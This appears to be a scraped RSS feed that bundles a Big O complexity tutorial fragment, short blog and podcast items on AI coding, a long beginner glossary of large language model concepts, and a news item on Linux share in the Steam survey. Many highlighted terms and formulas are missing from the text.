}If half the numbers are even, that’s roughly  elements which still counts as  space.3) Quadratic Space - O(n²)Storing a full matrix (like an adjacency matrix or Dynamic Programming (DP) table) of size  takes  space.Space complexity isn’t only about the extra data structures you create. Recursion also consumes memory through the , and this often goes unnoticed.Every recursive call adds a new frame to the stack until the function returns. Depending on the algorithm, this stack usage can range from logarithmic to linear, or even worse.For example, the naive recursive Fibonacci solution branches twice for each call. It takes  time but still uses  space because at most  calls are active on the stack at once.For  on a tree, the stack depth is proportional to the .In a ,  → so space is In the worst case (a skewed tree),  → so space becomes Now, lets talk about how to  the complexity of a piece of code.The simplest way is to break your code down into parts and analyze each part separately.Rule 1: Add Complexities of Sequential OperationsIf your algorithm performs one block of work  another, you  their time complexities.Imagine your code has two separate, sequential loops:// Block A: O(n)
for (int i = 0; i < m; i++) {
  // ... do O(1) work
}

// Block B: O(n^2)
for (int i = 0; i < n; i++) {
  for (int j = 0; j < n; j++) {
    // ... do O(1) work
  }
}The total runtime is the time for Block A  the time for Block B which comes out to be O(m) + O(n^2).Rule 2: Multiply Complexities of Nested OperationsIf you algorithm has nested loop with the outer loop running n times and the inner loop running m times, the total complexity is O(n * m).// Block A: Outer loop runs n times -> O(n)
for (int i = 0; i < n; i++) {
  
  // Block B: Inner loop runs n times -> O(n)
  for (int j = 0; j < n; j++) {
    // ... do O(1) work
  }
}Rule 3: Drop Constant FactorsThis rule states that we can ignore any constant multipliers in a Big O expression.When you derive a time complexity expression, you may end up with something like:  or .Big O is not about the , it’s about how fast your algorithm grows with input.Whether your algorithm takes  steps or  steps, both grow  as  increases,  the constant multiplier doesn’t affect the growth trend. If you double the input, the runtime for both will (roughly) double.So we drop constant factors: simplifies to  simplifies to  since 1/3 is also just a constant factorRule 4: Drop Lower-Order TermsIf your final expression has multiple terms, you keep only the one that grows the fastest, the  and drop the rest.Why? Because as  becomes very large, slower-growing terms become insignificant.Lets use the example O(n^2 + n + 100). Imaging n = 1,000,000 (one million). which is the dominant term becomes one trillionwhile  is just one million and the constant term stays at 100At scale, the lower-order term  in the overall growth. So we only keep the term that dominates. simplifies to  simplifies to If you found it valuable, hit a like ❤️ and consider subscribing for more such content.If you have any questions or suggestions, leave a comment.This post is public so feel free to share it.

For up-to-date eyes on these issues, I follow the writings of coiner of that phrase: Simon Willison. Here he examines a post on how OpenAI is thinking about these issues.My takeaways from all of this? It’s not done much to influence my overall skepticism of the entire category of browser agents, but it does at least demonstrate that OpenAI are keenly aware of the problems and are investing serious effort in finding the right mix of protections.                ❄                ❄                ❄                ❄Unsurprisingly, there are a lot of strong opinions on AI assisted coding. Some engineers swear by it. Others say it’s dangerous. And of course, as is the way with the internet, nuanced positions get flattened into simplistic camps where everyone’s either on one side or the other.A lot of the problem is that people aren’t arguing about the same thing. They’re reporting different experiences from different vantage points.His view is that beginners are very keen on AI-coding but they don’t see the problems they are creating. Experienced folks do see this, but it takes a further level of experience to realize that  these tools are still valuable.Interestingly, I’ve regularly seen sceptical experienced engineers change their view once they’ve been shown how you can blend modern/XP practices with AI assisted coding.The upshot is this, is that you have be aware of the experience level of whoever is writing about this stuff - and that experience is not just in software development generally, but also in how to make use of LLMs. One thing that rings clearly from reading Simon Willison and Birgitta Böckeler is that effective use of LLMs is a skill that takes a while to develop.                ❄                ❄                ❄                ❄Charlie Brown and Garfield, like most comic strip characters, never changed over the decades. But Doonesbury’s cast aged, had children, and some have died (I miss Lacey). Gary Trudeau retired from writing daily strips a few years ago, but his reruns of older strips is one of the best things in the shabby remains of Twitter.A couple of weeks ago, he reran one of the most memorable strips in its whole run. The very first frame of Doonesbury introduced the character “B.D.”, a football jock never seen without his football helmet, or when on duty, his military helmet. This panel was the first time in over thirty years that B.D. was shown without a helmet, readers were so startled that they didn’t immediately notice that the earlier explosion had removed his leg. This set off a remarkable story arc about the travails of a wounded veteran. It’s my view that future generations will find Doonesbury to be a first-class work of literature, and a thoughtful perspective on contemporary America.]]></content:encoded></item><item><title>Hasan Piker on Cancel Culture</title><link>https://www.youtube.com/shorts/t65eEN-463A</link><author>Channel 5 with Andrew Callaghan</author><category>yt</category><enclosure url="https://www.youtube.com/v/t65eEN-463A?version=3" length="" type=""/><pubDate>Mon, 3 Nov 2025 20:20:27 +0000</pubDate><source url="https://www.youtube.com/channel/UC-AQKm7HUNMmxjdS371MSwg">Channel 5 with Andrew Callaghan</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>The overlooked power of URLs (News)</title><link>https://changelog.com/news/168</link><author></author><category>podcast</category><enclosure url="https://op3.dev/e/https://cdn.changelog.com/uploads/news/168/changelog-news-168.mp3" length="" type=""/><pubDate>Mon, 3 Nov 2025 20:00:00 +0000</pubDate><source url="https://changelog.com/podcast">Podcast - Changelog</source><content:encoded><![CDATA[Ahmad Alfy explains how URLs are state containers, Shrivu Shankar shares how he uses every Claude Code feature, Yusuf Aytas laments how AI broke technical interviews, Wu Xiaoyun tells how he saved TikTok $300k during his internship, and TOON is a new serialization format to save us some LLM tokens.Changelog++ members support our work, get closer to the metal, and make the ads disappear.

However, what you really need is a solid understanding of how they work.People use terms like tokens, embeddings, and hallucinations to explain things. But if you don’t understand those words, it’s tough to know what to fix.This article is a plain-English field guide to that vocabulary and the foundations of this field. You don’t need the math, the specific prompts, or the coding skills; you just need to know what these terms mean in practice so you can get better results, spot failure modes, and make sensible choices about models and settings.Along the way, we’ll use simple examples to make the concepts easier to digest. Don’t worry about memorizing every detail; this guide exists so your next interaction with LLMs feels more natural, less like magic, and so you can recognize their mistakes more clearly.Let’s begin with the first and most basic ingredient.He’s the founder of Towards AI, where his focus is on making AI more accessible by helping people learn practical AI skills for the industry alongside 500k+ fellow learners.He’ll also be turning this article into a series of videos, so if you’d like a step-by-step refresher through video, it’s worth following him along on:After you develop the core foundations through this newsletter, you can go further with his . It’s a great starting point to learn how to bring AI into your daily work and boost your productivity.(You’ll also get a 15% discount when you use the code .)Running Kafka in the cloud shouldn’t feel like setting money on fire. But for most teams, it does! Storage costs skyrocket, clusters crawl, and scaling takes hours instead of seconds.That’s why top companies like Grab, JD.com, and others are switching to  - an open source, diskless Kafka® on S3.Here’s what happens when you make the switch:Scale in 10 seconds (not 43 hours)Reassign partitions in seconds (no downtime, no stress)Zero inter-zone data transfer feesNo more over-provisioningData lands fresh in secondsSeamless integration with IcebergWorks with your existing Kafka features & toolsKeeps pace with the Kafka communityIf Kafka had been designed for the cloud from day one, AutoMQ would be the result.While today’s generative models are built upon a decade of progress, 2022 was the year when they triggered an “Aha!” moment for most. Generative AI is a subfield of machine learning. It involves training artificial intelligence models on large volumes of real-world data to generate new content (text, images, code, etc.) that resembles human creation.This may have been a mouthful. Let’s clarify these terms first before we jump into LLMs. Here’s a plain-English map of those first words you’ll see. is the big umbrella: getting computers to do things that look intelligent. lives inside AI: systems learn from data instead of hard-coded rules. is a way for computers to learn patterns by practicing on a huge number of examples. (natural language processing) is the part of AI that works with human language. As simple as that. is the branch that  new content (text, images, audio, code). Whatever it is, it just means it  things rather than  things, as done with more classical AI systems. (Large Language Models) are deep learning models within the generative AI family that specialize in .That’s all you need for now: AI → ML → DL → (NLP) → . With the labels straight, we can understand what an LLM actually does.An LLM is a powerful autocomplete system. It’s a machine built to answer one simple question over and over again: “Given this sequence of text, what is the most probable next token?” That “piece of text” is called a —it can be a word, a part of a word (like runn and ing), or punctuation.For example, if a user asks ChatGPT, “What is fine-tuning?”, it doesn’t “know” the answer. It just predicts the next token, one at a time:The most probable first token is “”.Given that, the next most probable token is “”.Next is “”, and so on...Until it generates a full sentence: “Fine-tuning is the process of training a pre-trained model further on a smaller, specific dataset.”It’s called a  for three simple reasons:: It has billions of internal variables (called ) and was trained on a massive amount of text.: It’s specialized for understanding and generating human language.: It’s a mathematical representation of the patterns it learned.So, at its heart, an LLM is just a very advanced guessing machine: predicting the next token again and again until a full answer appears. So, how does it get good at making those guesses in the first place?To get there, the model undergoes a long study session of its own—a process called . For example, if a student is asked to read every book in a giant library (a huge slice of the internet, in the case of LLMs). They’re not trying to memorize pages word-for-word. Instead, they learn patterns—how words, sentences, and ideas fit together—well enough to predict the next piece of text in any sentence. This is how a base model like GPT-5 is built during pre-training.The Hidden Machinery: What Happens UndergroundYou don’t need to know every nut and bolt of how an LLM works to use one. Understanding key building blocks like tokens, embeddings, and parameters makes the system seem less magical. It also helps you spot where models shine, where they stumble, and how to get better results when you work with them.An LLM is, at its core, a mathematical system. That creates a basic problem: it only understands numbers, not words. So how can an LLM possibly read a user’s question like The first step is to translate the text into something the model can work with. That starts by breaking the sentence into its smallest meaningful chunks, called . A  can be a whole word (hello), a common part of a word (runn + ing), or even just punctuation (?).A special program called a  handles this. For any question, it first splits the text into a list of tokens:[“What”], [“is”], [“fine”], [“-”], [“tuning”], [“?”]Then, the tokenizer swaps each unique token for a specific ID number. The question finally becomes a sequence of numbers the model can understand, like [1023, 318, 5621, 12, 90177, 30]. Now, the model has a list of numbers it can finally work with.But tokens alone don’t carry meaning; they’re just IDs. To make sense of them, the model needs another layer.With tokenization, we turned the user’s question into a list of ID numbers ([1023, 318, 5621...]), but right now, these numbers are just random labels. The ID for “cat” doesn’t relate to the ID for “kitten.” So, the model can’t grasp their meanings or how they connect.This is where  come in. An  is a special list of numbers—a vector—that represents the meaning of a token. Instead of a random ID, each token gets a rich set of coordinates that places it on a giant “map of meaning.”On this map, words with similar meanings, like “dog” and “puppy,” are placed very close together. This allows the model to understand relationships numerically. For example, the distance and direction from “king” to “queen” on the map is the same as from “man” to “woman.”This concept is also how chatbots and search systems can find information phrased in different ways. If you ask a search engine about “cars,” embeddings help it realize that data mentioning “automobiles” is still relevant.Embeddings don’t float around randomly; they all exist inside a much larger structure.Now that the model has a question in the form of an , that embedding doesn’t sit alone. This “understanding” of meaning happens inside what we call the —the vast “map of meaning” where all embeddings live.It isn’t a physical space, but a mathematical one created by the model. During training, the model organizes concept embeddings in this space. This setup ensures their positions and distances show real-world relationships.For example, if you ask a chatbot about “fine-tuning,” your question’s embedding will be close to those of others about training methods. The model’s job is then simple: look around the neighborhood and pull in the closest matches.Behind this ability lies something deeper: the model’s internal settings—the part that decides how all of this gets organized.The base model for systems like ChatGPT has billions of internal variables. These are known as . These aren’t rows in a database or a list of facts. They’re the adjustable settings that give the model its ability to represent grammar, concepts, and patterns.A good way to picture them is as a massive wall of knobs and dials. At the start, every knob is set randomly—nothing useful yet. During training, the model plays its prediction game trillions of times. Each wrong guess makes a small change to the dials. This moves them closer to the settings needed for the right answer.After many tiny updates, the final setup of knobs encodes everything the model has learned. This includes language patterns, idea connections, and bits of general knowledge.Left untouched, billions of random knobs are meaningless on their own. They gain knowledge only through the long process of training.How LLMs Learn: How the Machinery is TrainedThe process that turns random parameters into a knowledgeable system is called .In this foundational phase, the model is exposed to a massive dataset of text and code from the internet. Its one objective is simple: predict the next  in a sequence. Every time it guesses, it checks its answer against the real token. Then, the training algorithm tweaks its billions of parameters just a bit. After trillions of repetitions, these microscopic updates encode the statistical patterns of language. That’s how a base model like GPT-5 learns grammar, common facts, and basic reasoning skills, before it is adapted for real-world use.This training can be understood in two steps: the task itself and the result of repeating it on an enormous scale.1. The Task: Predict the Next TokenThe model is shown a snippet of text, for example: “Fine-tuning is the process of…” Its job is to guess the missing piece. At first, guesses are random. But each mistake prompts a small correction to its parameters, making the right answer, like  a little more likely next time.2. The Result: A Pattern-Matching EngineAfter trillions of these corrections, the model becomes remarkably good at spotting patterns. It has seen phrases like “fine-tuning is the process of training” so often that the connection sticks. But it isn’t “understanding” or “thinking.” It’s just reproducing patterns it has learned.Pre-training gives us a model packed with patterns from the internet. But at this stage, it’s still just a text predictor. To see why that’s a problem, we need to look at the difference between a  and an .6. Base Model vs. Instruct ModelWhen a model finishes , it’s called a . It holds vast knowledge, but it’s not yet designed to be a helpful assistant. For example, if you used a raw base model and asked, , it might simply continue the sentence in a predictive way or give a generic, unhelpful definition. It’s powerful as a text predictor, but it isn’t specifically trained to follow instructions or engage in conversation.To make it useful for applications like chatbots, search assistants, or copilots, we need an .An  is a base model that has received extra training. This training, known as , is done with a specific dataset of instruction-and-answer pairs. This process doesn’t teach the model new facts; instead, it teaches it how to behave. It learns user intent. It gives clear explanations and structures responses well. Models like ChatGPT and Claude are instruct models. They are designed from the ground up to be helpful and responsive, making them essential for task-oriented applications.One way to turn a base model into an instruct model is by training it further on carefully chosen examples. This extra step is known as . is the process of taking a model that has completed  and further training it on a smaller, high-quality dataset to specialize it for a specific task. Instead of the whole internet, the dataset might contain just a few thousand carefully selected examples relevant to the target use case.One of the best-known examples is . The base model generates all types of text. By fine-tuning on billions of lines of open-source code, Copilot learns to write, complete, and suggest code that matches developers’ styles. The fine-tuned version doesn’t “know more” about programming. It’s just better aligned with real-world code patterns. This makes it much more reliable in practice.This targeted training makes small changes to the model’s . It helps the model copy the style and accuracy of the specific dataset.Fine-tuning gives smaller models the right balance of cost and quality. But good answers aren’t just about accuracy; they also need to be safe, clear, and appropriate. That’s where model behavior comes in.Shaping Behavior: Turning Raw Knowledge Into a Helpful AssistantWith fine-tuning, a model may now be able to follow instructions. But what makes an answer a  answer? A raw model trained on the internet may provide a technically correct but confusing answer for beginners. It might also repeat harmful stereotypes it learned during training.This is the core challenge of : ensuring that an LLM’s behavior aligns with human values and intentions, specifically to make it helpful, honest, and harmless. For example, ChatGPT is aligned to turn down requests for unsafe content. It simplifies complex ideas when asked. It also steers clear of biased or offensive language. The goal is to make the model behave in ways that are useful and socially acceptable, not just statistically accurate.Alignment doesn’t add new facts to the model. Instead, it shapes how the model responds. This is achieved through specific techniques, including the one we’ll discuss next.9. Reinforcement Learning from Human Feedback (RLHF)So, how do we achieve ? We can’t just tell a model, “Be more helpful.” We need a way to teach it what human quality and helpfulness actually look like. This is where a powerful training technique called RLHF comes in.Instead of just training on text, RLHF tunes the model based on human preferences. Here’s how it works in practice: The model is asked a question (e.g., ) and generates several possible answers. Human reviewers then rank these responses from best to worst. This ranking data is used to train a separate  whose only job is to predict how a human would likely rate any given answer.The Model Learns from the Judge: The language model generates answers again, but this time the reward model scores them. The LLM’s internal  are nudged to favor higher-scoring responses, gradually teaching it to produce answers that align better with human preferences.This process helps models like ChatGPT and Claude learn what humans value in responses. These qualities include clarity, helpfulness, politeness, and safety. It does this without manually coding those behaviors. However, a model only generates a response when given an input.How You Talk to Them: Interaction Layer10. Prompt (System vs. User)The input, the complete set of instructions and context sent to the model, is called a .A well-designed prompt often has two distinct parts: This outlines the main instructions that set the model’s role and limits. It acts as a permanent guide for the model’s behavior in every interaction. For example, ChatGPT might run with a hidden system prompt like:“You are a helpful assistant. Answer as clearly and concisely as possible, and avoid unsafe or biased content.” This is the specific, immediate question or command from the user. For instance:The model processes both of these together. The system prompt tells it how to behave, while the user prompt tells it what to do. This separation is crucial for ensuring the model’s responses are consistently helpful and on-topic.A prompt works well for a single exchange, but conversations are rarely just one turn. To stay coherent across multiple turns, the model relies on its .For a chatbot or assistant to be useful, it must handle follow-up questions. If a user asks, “Can you explain that differently?”, the model needs to remember what “that” refers to. This memory is managed by the .The  is the maximum number of  the model can “see” and process at one time. This includes the system prompt, the full conversation history, and the response it is currently generating. The model cannot see anything outside this window.This memory limit is critical. If a chat with ChatGPT, Claude, or Gemini lasts too long, the app has to shorten the history. It often removes the oldest messages. This keeps the model from losing recent context.Within that window, how you structure the prompt is what steers any single answer.12. Zero-shot vs. Few-shot LearningThese terms describe two fundamental techniques for structuring a  to control the model’s output. The choice between them depends on how much guidance the model needs to perform a specific task correctly. This is when we provide an instruction with . This approach relies entirely on the model’s pre-existing ability to understand and execute the command. For a general-purpose assistant (e.g., ChatGPT), when a user asks a direct question like, “What is fine-tuning?”, it is a zero-shot request. We are trusting the aligned model to know how to form a good answer without any examples. This is when we include both an instruction and  (called “shots”) of the desired output directly in the prompt. This technique is essential when we need to guide the model’s output format or style. For a chatbot, if we wanted to ensure all summaries are formatted as three concise bullet points, we would provide examples of this format in the prompt before giving it the new text to summarize.Few-shot prompting is a powerful way to get more reliable and consistently structured outputs from the model.13. Reasoning & Chain-of-Thought (CoT)Sometimes, a user may ask a chatbot a tricky question that needs several steps to answer. For example, they might say, “Compare RAG to fine-tuning and explain which is better to stop hallucinations.” If the model tries to answer directly, it can easily make a logical error.This is a failure of . To improve this, we use a prompt engineering technique called . Instead of just asking for the final answer, we add a simple instruction to the prompt: “Let’s think step by step.”This makes the model create a logical chain of steps. First, it outlines the definition of RAG. Then, it fine-tunes and compares them. Finally, it gives the conclusion. By “showing its work,” the model dramatically increases the accuracy of its reasoning for complex problems.Newer, reasoning-focused models take it a step further: they often have this “step-by-step” thinking built in. They don’t need a specific prompt. Instead, they create their own internal thought process. This helps them answer complex problems more accurately. For example, state-of-the-art models like Google Gemini 2.5 Pro, OpenAI GPT-5, and Anthropic Claude Opus 4.1 exhibit these advanced reasoning capabilities.A lot happens between pressing enter and seeing a response. The way the model processes the input, how long it takes, and the character of its answer all depend on a few key factors.Running in Real Time: What Happens When You Hit EnterOnce a chatbot like ChatGPT receives a complete prompt, it begins the process of generating an answer. This process of a trained model creating an output is called .When you see the answer appearing word by word, you are watching inference in real time. It is not writing a full sentence at once. Instead, it predicts the single most probable next , adds that token to the sequence, and then repeats this cycle over and over again. This token-by-token generation continues until it produces a special “end-of-sequence” token or reaches its maximum output length.The time a user has to wait between asking a question and receiving a complete answer is called . This is a critical factor in user experience, as high latency can make an AI system feel slow and unresponsive.Because  happens token-by-token, latency is measured in two key parts:Time-to-first-token (TTFT): The time it takes for the first piece of the answer to appear. A low TTFT is crucial because it signals to the user that the assistant is working. The speed at which subsequent tokens are generated. This determines the “typing speed” of the model.For a chatbot to feel effective, both of these latency metrics need to be low.Speed is only half the runtime story; once tokens are flowing, you still choose how predictable or varied they should be.16. Temperature & Deterministic vs. Stochastic OutputsTemperature adjusts the level of randomness in the model’s token selection. When ChatGPT or Claude answers the same question multiple times, should it give the exact same response every time? We control this using a key  setting called .A  output ensures the same input always produces the exact same output. We achieve this with a very low temperature (e.g., 0.0), which forces the model to always pick the single most probable next token. This is ideal for factual definitions where consistency is key.A  output means the same input can produce different responses. A higher temperature allows the model to choose from a wider range of probable tokens, making its answers more varied. This can be useful if a user asks the chatbot to “explain it another way.”Once you start using LLMs, you’ll notice they don’t always know the right answer. That failure mode, confident but false output, is called . This can be partly solved through architectures and extensions built on top of LLMs.Architectures and Extensions: Building Beyond the Basics is the principle of forcing an LLM’s output to be based only on a verifiable, external source of truth that we provide. This is one of the most straightforward ways to mitigate hallucination (to some extent). Instead of relying on its vast but unreliable internal memory, we connect the model to trusted data sources. If the information isn’t available, a grounded system should be able to say it doesn’t know—rather than guess.18. Retrieval-Augmented Generation (RAG)So, how do we technically implement  in real time? The architecture used for this is Retrieval-Augmented Generation (RAG). It enhances accuracy by connecting the model to a knowledge base or external data source the moment it’s needed.A widely known example is . When you ask a question, it doesn’t just pull from memory. It searches the web, finds relevant sources, and adds this information to its answer. The RAG process works in three steps: The system first searches trusted documents or web sources to find the most relevant text snippets. These snippets are then automatically added to the prompt, giving the LLM a kind of “cheat sheet” with the correct information. The LLM is instructed to generate an answer based  on the retrieved evidence.This way, every response is grounded in a verifiable source, which both improves accuracy and helps users trust the output. Models can be expanded to do more tasks. They can have different levels of autonomy to address other limitations.There are two fundamental ways to build an  system, each with different levels of control and flexibility.A  is a system where the developer defines a fixed, predictable sequence of steps. The LLM is a component within this process. A RAG system like Perplexity always follows the same “Retrieve → Augment → Generate” process. Workflows are highly reliable and controllable.An  is a system where the LLM acts as the  that directs its own process. Instead of following a fixed path, the agent is given a goal and a set of tools (like a web search or a calculator). It then dynamically plans which tools to use, and in what order, to achieve the goal. Agents are far more flexible but less predictable.Most chatbots today are reactive. They wait for a question and give one answer.  raises a bigger question: can the system plan and carry out multi-step tasks on its own?An  system allows an LLM to plan and perform actions to reach a complex goal. This changes the model from a simple tool into the “brain” of a system that can act independently. For example, instead of just answering , an agentic assistant could take a request like “Create a study guide on fine-tuning.” It could then search for documents, pull out key concepts, and put them into a structured summary—without needing more input from a human.Orchestration (workflow vs. agent) is only part of the design. The other part is the model you pick. This includes size, modality, and deployment. These factors affect cost, latency, privacy, and capability.Different Flavors of Models: LLM Families and Tradeoffs21. Proprietary vs. Open-Source ModelsAt some point, anyone building with LLMs faces a practical decision: which kind of model should I use? If you’re just experimenting, this choice may not be very important. You’ll probably begin with a proprietary API like ChatGPT since it’s easy to use and available. But as soon as you want to deploy something at scale, reduce costs, or customize a system, the type of model you choose becomes critical.There are three main categories, each with significant tradeoffs in terms of cost, control, and complexity: These models (like OpenAI’s GPT-5) are owned and operated by a company. You access them as a paid service, and cannot see or modify the model’s internal workings. Many developers start here because proprietary models offer powerful capabilities and are easy to integrate using APIs. These models (like Meta’s Llama 3.1, Mistral 7B, or Google’s Gemma 2) are released with their weights available to the public. However, they aren’t fully “open-source.” The training data and methods are usually kept private, and licenses can have restrictions. Open-weight models give you transparency and flexibility to run them yourself while still benefiting from cutting-edge performance. Truly open models share not just the weights. They also provide the training code, data, and methods. All this is under permissive licenses. They maximize control and reproducibility, but they often fall short of the best proprietary or open-weight systems in performance.22. API (Application Programming Interface)Whichever model you choose, proprietary, open-weight, or open-source, you’ll need a way for your application to actually talk to it. In most cases, especially when starting out, that connection happens through an .An API (Application Programming Interface) is a way for our app to talk to the model provider. It sends a  and gets back the generated text. Think of it like ordering food with a delivery app. The app doesn’t cook your meal. Instead, it sends your order to the restaurant. Then, it delivers the dish to you. In the same way, your code doesn’t run the massive LLM—it sends a request to the provider’s servers through the API, and the model returns the response.For example, when you use ChatGPT in your browser, you’re not running GPT-5 on your laptop. Your message is sent through an API to OpenAI’s servers, where the model generates a reply and sends it back to your screen.Even if you use open-weight models on your own, you’ll still likely share them through an API. This lets your application interact with them the same way.23. SLM (Small Language Model)While powerful, large models can be costly to run. A third option is emerging that offers a solution: the SLM (Small Language Model). are efficient models with fewer parameters, usually under 15 billion. They are made to excel at specific tasks. Their small size makes them fast, cheap to run, and capable of operating on local devices like a laptop or smartphone.For example,  and  are SLMs that can run on consumer-grade hardware. This allows apps to offer features like private chat, offline assistants, or on-device copilots. A personal AI on your phone means you keep your data private. You won’t need to send anything to the cloud. This leads to lower costs and access even when you’re offline.24. Modality & MultimodalityCurrently, many models only handle a single type of input: text. That type of input is called a . If you upload a diagram and ask, “What does this chart mean?”, a text-only model can’t help. The model needs to be . It should read your question and look at the image at the same time.Some modern systems already do this. GPT-4o and Gemini 1.5 Pro can take text, images, and audio together, which makes their answers more contextual and useful.A quick note on image generation: many tools use an LLM with a . This model starts with noise and gradually “de-noises” it to create a picture, guided by the text. Popular examples include Stable Diffusion, Midjourney, and DALL·E. Other models are multimodal. They combine text and image generation in one system. This lets them understand and create visuals without needing an external tool.The first approach is modular and flexible; the second feels more seamless. Both involve tradeoffs across quality, control, speed, and cost.Reasoning models are a newer class of LLMs designed for multi-step problem solving. They don’t rush to reply. Instead, they take a moment to jot down some notes. This helps them stay focused on tasks. It helps to compare options, follow rules, do simple math, or answer “explain-then-decide” questions. You can think of them as models with a built-in version of “let’s think step by step.” Choose a reasoning model when the tough part is thinking. This includes synthesizing ideas, weighing trade-offs, or linking steps together. Expect a trade-off. These models usually take longer and can cost more. However, compact instruct models are still better for quick definitions, short rewrites, or simple lookups.Architectural categories alone don’t tell us whether a model is suitable. To move from tradeoffs on paper to practical use, we need ways of measuring model capability in a standardized way. How We Know If They’re Any GoodWhen choosing between models like GPT-4o, Llama 3.1, or Claude 3, how do we objectively compare their raw capabilities? The answer is . are standardized tests used to measure and compare the abilities of different LLMs. These cover a wide range of tasks: general knowledge (e.g., ), coding (e.g., ), or logical reasoning (e.g., ). Testing models on the same benchmark gives us scores. These scores help us rank the models and find their strengths and weaknesses. This is important before using them in real-world applications.It’s important to note that benchmarks are  The best-performing model for coding may not excel in reasoning or summarization. Also, new benchmarks are always emerging. This means rankings shift as models improve and focus on different tasks.Two popular, real-world benchmark leaderboards are:A high  score shows that a model is capable, but it doesn’t guarantee it will perform well in your application. Even the best model can give bad answers. This happens if prompts are weak, the retrieval system shows irrelevant documents, or the outputs are unclear.That’s why we also measure —specific indicators of quality tailored to the use case. For example, in a RAG-based chatbot or assistant, two common metrics are: Does the answer stick  to the retrieved documents? (Helps measure hallucination control.) Does the answer directly address the user’s question? (Measures the quality of retrieval and grounding.)Metrics let us move from “is the model good in general?” to “is the system good for  users?”We have our , like faithfulness and relevance. But how do we evaluate them across thousands of student conversations? Manually checking every single answer is impossible. This is a problem of evaluation at scale.The solution is a technique called . This method uses a powerful, state-of-the-art LLM (the “judge”) to automate the evaluation of another model’s output. We provide the judge model with the original prompt, the candidate model’s response, and an evaluation rubric based on our metrics. The judge then returns a score and explanation.This makes it possible to run large-scale evaluations quickly and consistently. For example, many research labs now use GPT-5 or Claude Opus as “judges”. They evaluate smaller models on tasks like faithfulness, reasoning, and style.Benchmarks and metrics help us see how capable a model is, but they don’t show the full picture. To really understand how these systems behave, we also need to look closely at the ways they go wrong.Where They Fail (and How to Patch Them)One major issue with large language models is hallucination. This is when they confidently create false information. LLMs aim to predict the next likely word, not to check facts. As a result, they can generate text that sounds convincing but is completely made up. For example, a model might invent citations, creating realistic-looking references to non-existent research papers. Lawyers have reported models fabricating court cases. Users have also seen them generate biographies with incorrect career details. The danger lies not just in wrong answers, but in how persuasively they are presented. This makes errors harder to spot. In fields like medicine, finance, or law, even one hallucination can cause major harm.30. Poor Mathematical & Logical ReasoningAlthough LLMs appear fluent, they are not built to follow strict logic or carry out calculations. They can mimic mathematical expressions, but without the reliability of a calculator or solver. This weakness appears when the model multiplies large numbers or solves multi-step problems. It may provide the correct first step but then go off track, leading to an inconsistent conclusion. For example, earlier GPT versions often struggled with basic math. They confidently claimed that 7 × 8 = 54. They also had trouble with logical puzzles that needed careful thinking. These errors highlight the model’s nature as a pattern-matcher, not a thinker. In practice, this makes them risky for tasks like financial modeling, scientific analysis, or debugging code, unless paired with external tools that enforce step-by-step precision.Every LLM inherits bias from its training data. Internet text reflects a wide range of human perspectives, including stereotypes and prejudices. Here, bias means a tendency in how the model responds. Some biases can be helpful, while others are harmful. A biased model may favor one group over another—for instance, linking men with technical jobs and women with caregiving roles. Studies show that models can produce biased outcomes in job recommendations, sentiment analysis, and image generation. This issue is both social and practical: biased outputs can erode trust, reinforce inequalities, or harm a brand’s reputation. On a positive note, intentional “biasing” can promote useful traits, such as helping models maintain a patient or supportive tone in customer service.Another structural limitation is the knowledge cutoff. Since models are trained on data available only up to a certain date, their knowledge is frozen in time. GPT-3.5, for example, could not answer questions about events after 2021, including the launch of ChatGPT itself. A user asking about a new AI paper from last week or the latest programming language version might receive an outdated or made-up answer. This lag makes LLMs unreliable in fast-moving areas. This includes current events, new research, and company-specific knowledge. Without retrieval mechanisms or fine-tuning on more recent data, they cannot bridge this temporal gap, and users must be cautious not to treat them as up-to-date sources.33. Guardrails / Safety FiltersEven when a model is accurate, it can still fail by producing content that is unsafe, inappropriate, or off-topic. Guardrails and safety filters are systems designed to prevent this. They work by screening both the user’s input and the model’s output against defined rules, ensuring the assistant stays within safe and relevant boundaries. A good example is when someone asks a chatbot how to build a weapon. A well-protected system will refuse. In contrast, an unprotected one might try to help. Companies like OpenAI and Anthropic enforce such filters to block responses related to violence, self-harm, or private data. Without these measures, AI applications can face reputational damage, violate regulations, or harm user experiences. Guardrails are what turn a raw language model into something that can be trusted in professional and everyday use.Each weakness—hallucination, reasoning errors, bias, outdated knowledge, and lack of guardrails—has its own technical fix. None of them is sufficient alone, and each comes with tradeoffs. is best reduced through , often using Retrieval-Augmented Generation (RAG). Instead of relying on its unreliable memory, RAG adds trusted documents to the prompt. This keeps the model’s answer tied to verifiable sources, but it needs a strong knowledge base to work well. can improve when we pair models with tools like calculators, code interpreters, or structured workflows. Here, the model doesn’t try to do all the work itself but acts as a “router” that delegates subtasks to the right resource. This boosts reliability in math, logic, and multi-step tasks. However, it comes with increased latency and more complex systems. is managed through  like Reinforcement Learning from Human Feedback (RLHF), carefully designed , and . Together, these methods nudge the model toward outputs that are helpful and fair. Importantly, bias can also be shaped deliberately: for example, configuring a support assistant to always adopt a patient and encouraging tone. can be overcome in multiple ways. RAG lets you add private or recent documents to old training data. Fine-tuning on newer datasets helps models fit specific areas. Live web search offers real-time access. Each option offers a different mix of freshness, accuracy, privacy, and cost. Therefore, the right choice depends on the situation. serve as the final safety layer. They filter incoming queries and outgoing responses. This enforces scope and prevents harmful, irrelevant, or sensitive outputs. Effective guardrails combine static rules with dynamic monitoring, allowing flexibility without compromising safety.In practice, the hard part isn’t knowing that hallucination or bias exist, or that tools like retrieval and fine-tuning are available. The real challenge lies in deciding which combination of techniques makes sense for a specific context. A financial assistant, a medical chatbot, and an educational tutor each need different mixes of retrieval, reasoning, alignment, and guardrails.Every decision—accuracy vs. cost, freshness vs. safety—involves a tradeoff. Building reliable AI isn’t about removing limits but about designing systems that handle them well.Large language models are advanced pattern-matchers, not sources of truth. Their strengths include fluency, reasoning, and broad knowledge. But they also have weaknesses like hallucinations, bias, and outdated information. What matters is how we design around them: choosing the right mix of prompting, retrieval, fine-tuning, and guardrails.If you remember one thing, let it be this: knowing the basic concepts gives you the ability to use LLMs more effectively and see their limits clearly.

Linux gamers on Steam as of the Steam Hardware & Software Survey for October 2025 have crossed over the elusive 3% mark. The trend has been clear for sometime, and with Windows 10 ending support, it was quite likely this was going to be the time for it to happen as more people try out Linux... 

Overall, 3% might not seem like much to some, but again — that trend is very clear and equates to millions of people. The last time Valve officially gave a proper monthly active user count was in 2022, and we know Steam has grown a lot since then, but even going by that original number would put monthly active Linux users at well over 4 million. 


Additional details from Phoronix:


